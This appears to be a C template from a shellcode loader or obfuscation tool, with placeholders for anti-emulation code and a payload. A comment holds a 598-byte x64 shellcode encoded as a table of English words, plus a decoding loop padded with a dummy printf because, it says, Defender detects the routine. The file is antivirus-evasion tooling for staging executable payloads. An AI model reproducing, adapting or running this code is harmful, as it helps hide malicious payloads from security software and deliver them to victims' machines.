#include <windows.h>
#include <stdio.h>


int main(void)
{
	{{ANTI_EMULATION}}

	{{SHELLCODE}}

	/* SHELLCODE will look like this:
	unsigned char* translation_table[256] = { "music","taste","wings","audio","endif","winds","crime","bonus","lanka","honey","simon","manor","screw","puppy","surge","watts","upper","dance","touch","heavy","tumor","scale","acute","wider","strap","tooth","colon","karen","fever","quiet","chart","donna","yacht","human","devil","belly","heath","class","shall","these","funds","discs","atlas","dying","arrow","spies","pairs","young","amber","exist","glory","offer","swift","focal","larry","bobby","tires","items","skirt","adult","blond","roman","stick","elvis","slope","scuba","value","lexus","cells","happy","joins","india","yards","smoke","train","bacon","sheet","blink","dairy","latex","feels","guide","shoot","holly","armor","bench","tours","cedar","fires","bands","firms","roads","known","going","mails","speak","laugh","heard","study","logan","packs","level","carey","shirt","loose","tapes","goals","maine","uncle","shine","dense","cases","cache","cards","favor","disks","coins","nokia","enter","fatty","bring","anger","singh","tribe","notre","saint","emily","moses","brown","kathy","busty","squad","gamma","debug","nikon","judge","guest","claim","lobby","bears","maybe","close","basic","catch","alarm","meant","chain","meyer","vital","clock","keith","ports","theme","enjoy","abuse","rooms","pipes","broad","words","outer","point","users","paste","aruba","hairy","spice","taxes","teach","paris","plate","roger","title","stone","gates","texts","smart","trade","berry","worry","photo","tunes","storm","panic","pumps","hello","fuzzy","mouth","joyce","grows","email","teddy","pills","birth","games","pride","skype","meter","yours","lyric","means","picks","diane","wagon","rouge","kevin","focus","scott","dolls","frost","today","small","alpha","track","smith","james","wanna","buses","spots","eight","stuck","indie","clean","weeks","jewel","solve","opens","civic","usage","array","nodes","mason","roots","sugar","dirty","sight","jesus","lloyd","strip","dream","might","tions","grams","brass","hired","julia","crazy","flood","march","combo","drops","delta","shaft","spank","jesse","arena","visit" };
	unsigned char* translated_shellcode[598] = { "spank","yards","squad","array","tions","sugar","kevin","music","music","music","scuba","guide","scuba","feels","shoot","guide","yards","exist","small","tours","level","yards","bears","shoot","laugh","yards","bears","shoot","strap","yards","bears","shoot","yacht","yards","watts","pumps","train","train","yards","bears","favor","feels","blink","exist","diane","yards","exist","birth","stone","blond","heard","notre","wings","arrow","yacht","scuba","games","diane","puppy","scuba","taste","games","civic","strip","shoot","yards","bears","shoot","yacht","scuba","guide","bears","value","blond","yards","taste","frost","carey","kathy","bring","strap","manor","wings","watts","debug","favor","music","music","music","bears","brown","guest","music","music","music","yards","debug","birth","coins","shirt","yards","taste","frost","feels","bears","yards","strap","cells","bears","slope","yacht","smoke","taste","frost","usage","tours","blink","exist","diane","yards","visit","diane","scuba","bears","swift","guest","yards","taste","james","yards","exist","birth","stone","scuba","games","diane","puppy","scuba","taste","games","tires","solve","nokia","grams","sheet","audio","sheet","heath","lanka","happy","items","today","nokia","buses","fires","cells","bears","slope","heath","smoke","taste","frost","carey","scuba","bears","screw","yards","cells","bears","slope","fever","smoke","taste","frost","scuba","bears","endif","guest","scuba","fires","scuba","fires","mails","yards","taste","frost","bands","firms","scuba","fires","scuba","bands","scuba","firms","yards","squad","lloyd","yacht","scuba","shoot","visit","solve","fires","scuba","bands","firms","yards","bears","touch","dirty","bacon","visit","visit","visit","going","yards","exist","stuck","holly","smoke","teddy","fatty","tapes","dense","tapes","dense","level","coins","music","scuba","tours","yards","claim","opens","smoke","means","pride","sheet","fatty","shall","bonus","visit","smith","holly","holly","yards","claim","opens","holly","firms","blink","exist","birth","blink","exist","diane","holly","holly","smoke","mouth","skirt","tours","anger","teach","music","music","music","music","visit","smith","sugar","upper","music","music","music","exist","items","glory","pairs","exist","larry","tires","pairs","exist","items","amber","pairs","exist","offer","swift","music","firms","yards","claim","games","smoke","means","birth","feels","music","music","music","blink","exist","diane","holly","holly","goals","audio","holly","smoke","mouth","cedar","claim","outer","lyric","music","music","music","music","visit","smith","sugar","blink","music","music","music","young","favor","level","happy","enter","packs","packs","goals","larry","cards","dense","train","maine","train","glory","bench","uncle","scuba","packs","larry","shirt","heard","scuba","enter","goals","enter","favor","maine","tapes","holly","lexus","cache","larry","blink","bacon","tours","disks","fires","fires","fatty","favor","dairy","singh","disks","loose","goals","loose","uncle","maine","cells","offer","bacon","logan","value","nokia","larry","scuba","maine","packs","lexus","fires","tires","coins","yards","larry","enter","train","sheet","fires","larry","bacon","shoot","cedar","bench","dense","cedar","music","yards","claim","games","holly","firms","scuba","fires","blink","exist","diane","holly","yards","hello","music","wings","funds","gamma","music","music","music","music","feels","holly","holly","smoke","means","pride","jesus","bench","pairs","adult","visit","smith","yards","claim","lyric","goals","simon","speak","holly","firms","yards","claim","grams","blink","exist","diane","blink","exist","diane","holly","holly","smoke","means","pride","spies","crime","strap","tribe","visit","smith","debug","birth","nokia","donna","yards","means","games","guest","heavy","music","music","smoke","mouth","cells","tions","focal","solve","music","music","music","music","visit","smith","yards","visit","dolls","coins","wings","jesus","kevin","sugar","bench","music","music","music","holly","bands","goals","slope","firms","smoke","claim","today","games","civic","upper","smoke","means","birth","music","upper","music","music","smoke","mouth","fires","hairy","holly","nodes","music","music","music","music","visit","smith","yards","meyer","holly","holly","yards","claim","roots","yards","claim","grams","yards","claim","eight","smoke","means","birth","music","yacht","music","music","smoke","claim","drops","smoke","mouth","touch","keith","claim","civic","music","music","music","music","visit","smith","yards","squad","meter","yacht","debug","birth","coins","worry","carey","bears","bonus","yards","taste","skype","debug","birth","nokia","small","fires","skype","fires","goals","music","bands","smoke","means","pride","tions","storm","paste","tours","visit","smith" };

	unsigned char shellcode[598] = {0};
	int sc_len = sizeof(shellcode);

    for (int sc_index = 0; sc_index < 598; sc_index++) {
		printf(""); // Defender is detecting the translation routine ¯\_(ツ)_/¯
        for (int tt_index = 0; tt_index <= 255; tt_index++) {
                if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {
                        shellcode[sc_index] = tt_index;
                        break;
                }
        }
    }
	*/
		
	int idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}
}
